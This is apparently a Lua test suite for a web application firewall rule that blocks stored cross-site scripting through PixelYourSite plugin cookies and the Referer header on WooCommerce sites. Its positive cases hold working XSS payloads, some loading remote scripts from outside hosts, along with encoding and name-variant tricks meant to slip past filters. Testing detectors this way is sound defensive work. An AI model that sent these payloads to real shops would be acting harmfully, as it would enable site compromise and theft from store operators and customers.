-- Tests for the PixelYourSite unauth stored-XSS detector (rule 10025,
-- WAF_CVE; CVE-2026-1844 / CVE-2026-1841 / CVE-2026-109987). Production
-- tier: block.
--
-- The plugin stores the pysTrafficSource / pys_landing_page cookies (and the
-- last_ twins) in a WooCommerce order and, before the fix, printed them
-- unescaped in the order screen. The positives are the payload shapes found
-- in planted orders on the fleet (2026-02-13 .. 2026-10-10); the negatives are
-- what the plugin's own JS stores there (a URL, a host name, "direct",
-- "undefined") and other cookies that merely mention the names.

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")
local det = require("cfm_waf_detectors")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local function set_only(map)
  local snap = waf.get_config()
  for k, _ in pairs(snap) do
    if k:sub(1, 5) == "rule_" then waf.set_rule(k, "disabled") end
  end
  for k, m in pairs(map) do waf.set_rule(k, m) end
end

local function req(method, uri, cookie, referer)
  return { uri = uri or "/", args = "", method = method or "GET",
           ip = "203.0.113.96", headers = { referer = referer }, body = "",
           cookie = cookie or "" }
end

local function fires(c, label, want_reason)
  local hit, reason = waf.check(c)
  check(hit == true, label .. " — hit=true (got " .. tostring(hit) .. ")")
  check(reason == want_reason, label .. " — reason=" .. want_reason .. " (got " .. tostring(reason) .. ")")
end
local function clean(c, label)
  local hit, reason = waf.check(c)
  check(hit ~= true, label .. " — must NOT fire (got " .. tostring(reason) .. ")")
end

set_only({ rule_cve_pixelyoursite_xss = "block" })

local MARKUP = "WAF_CVE:CVE_2026_1844:PIXELYOURSITE:COOKIE_MARKUP"
local ATTR   = "WAF_CVE:CVE_2026_1844:PIXELYOURSITE:COOKIE_ATTR_BREAKOUT"
local REF    = "WAF_CVE:CVE_2026_1844:PIXELYOURSITE:REFERER_HOST_MARKUP"

-- ── Positives: the fleet's planted shapes ───────────────────────────────────
fires(req("POST", "/wp-json/wc/store/v1/checkout",
          'pysTrafficSource="<script src=https://patchstackk.com/fz/x.js></script><!--P1181854187-->"; pys_landing_page="<!--P1181854187-->"'),
      "tophair 2026-10-10 payload on the Store API checkout", MARKUP)
fires(req("GET", "/?add-to-cart=11533&quantity=4",
          'woocommerce_cart_hash=x; pysTrafficSource="<script src=https://apix1.com/testx.js></script><!--P114512257-->"'),
      "payload rides on the session's first GET too", MARKUP)
fires(req("GET", "/checkout/",
          'pys_landing_page="<svg onload=alert(document.domain)><!--PYS3545786-->"'),
      "polygraf probe in the landing-page cookie", MARKUP)
fires(req("GET", "/", 'last_pysTrafficSource=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'),
      "URL-encoded markup in the last_ twin (PHP decodes cookies)", MARKUP)
fires(req("GET", "/", 'last_pys_landing_page=+%3Cscript%3E'),
      "plus-and-percent encoded value", MARKUP)
fires(req("GET", "/", 'a=1;pysTrafficSource=<script>x</script>'),
      "no space after the ';' delimiter", MARKUP)
fires(req("GET", "/", 'a=1;\t  pysTrafficSource=<b>'),
      "whitespace-padded name (PHP drops it)", MARKUP)
fires(req("GET", "/", '%70ysTrafficSource=%3Cscript%3E'),
      "URL-encoded cookie name (PHP decodes names)", MARKUP)
fires(req("GET", "/", 'PYSTRAFFICSOURCE=<script>'),
      "case variant over-reads on the safe side", MARKUP)
fires(req("GET", "/", 'pys.landing.page=x>y'),
      "dotted name PHP registers as pys_landing_page", MARKUP)
fires(req("GET", "/", 'pys_landing_page=https://shop.gr/" onmouseover="alert(1)'),
      "href attribute breakout without angle brackets", ATTR)
fires(req("GET", "/", 'pys_landing_page=x%22%20style%3D%22x'),
      "encoded quote + style breakout", ATTR)
fires(req("GET", "/", 'pys_landing_page=%22javascript:alert(1)'),
      "quote + javascript: scheme", ATTR)

-- Session leg: getTrafficSource() copies parse_url(Referer)['host'].
fires(req("GET", "/", "", "http://x<img src=x onerror=alert(1)>y"),
      "markup in the Referer host", REF)
fires(req("GET", "/", "", "https://u:p@a<svg onload=alert(1)>b:8080/path"),
      "markup in the host past userinfo and before the port", REF)
fires(req("GET", "/", "", "//<script>?q=1"),
      "scheme-relative Referer", REF)

-- ── Negatives: legit plugin values and unrelated cookies ────────────────────
clean(req("GET", "/", "", "https://www.google.com/"), "normal external Referer")
clean(req("GET", "/", "", "https://shop.gr/search?q=<script>"),
      "markup in the Referer QUERY (not the host the plugin keeps)")
clean(req("GET", "/", "", "https://shop.gr/<b>/x"), "markup in the Referer path")
clean(req("GET", "/", "", "<script>"), "no // in the Referer: parse_url gives no host")
clean(req("GET", "/", ""), "no cookie")
clean(req("GET", "/", "pysTrafficSource=google.com; pys_landing_page=https%3A%2F%2Fshop.gr%2Fproduct%2Fx%2F%3Fsrsltid%3DAU7gw4Up"),
      "plugin's real values (host + encoded URL)")
clean(req("GET", "/", "pysTrafficSource=direct; last_pysTrafficSource=direct; pys_landing_page=undefined"),
      "direct / undefined")
clean(req("GET", "/", 'pysTrafficSource="google.com"'),
      "legal quoted cookie value without a breakout token")
clean(req("GET", "/", "pys_landing_page=https%3A%2F%2Fshop.gr%2F%3Fq%3Dcats%2520%2526%2520dogs"),
      "double-encoded query in the landing URL stays encoded after one decode")
clean(req("GET", "/", "pys_session_limit=true; pys_start_session=true; pysAddToCartFragmentId=x"),
      "other PixelYourSite cookies")
clean(req("GET", "/", "foo=<b>; bar=x"),
      "markup in an unrelated cookie (not this rule's job)")
clean(req("GET", "/", 'foo=pysTrafficSource=<script>'),
      "target name only inside another cookie's value")
clean(req("GET", "/", "xpysTrafficSource=<script>; pysTrafficSourcex=<script>"),
      "near-miss names")
clean(req("GET", "/", "wordpress_logged_in_abc=admin%7C123; wp-settings-1=x"),
      "normal WP session cookies")

-- The detector alone, for the encoded-name gate.
check(det.detect_cve_pixelyoursite_xss("a=%3C") == nil,
      "a %-bearing cookie without a target name stays clean")
check(det.detect_cve_pixelyoursite_xss(nil) == nil, "nil cookie")

-- Disabled mode short-circuits.
set_only({ rule_cve_pixelyoursite_xss = "disabled" })
clean(req("GET", "/", 'pysTrafficSource=<script>'), "rule disabled")

if fails > 0 then
  io.stderr:write(("cfm_waf PixelYourSite CVE tests: %d FAILED\n"):format(fails))
  os.exit(1)
end
print("ok: cfm_waf PixelYourSite stored XSS (rule 10025, CVE-2026-1844)")
